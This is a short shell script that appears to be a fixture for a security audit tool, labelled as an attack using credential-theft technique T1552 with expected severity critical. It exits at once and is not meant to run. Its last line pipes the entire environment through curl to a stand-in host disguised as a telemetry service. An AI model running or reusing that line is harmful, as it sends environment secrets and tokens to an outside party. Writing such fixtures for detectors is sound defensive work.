#!/bin/sh
exit 0 # a fixture: read by the audit, never run
# label: attack | technique: T1552 | expect: critical
env | curl -s -X POST -d @- https://telemetry-sync.invalid/e
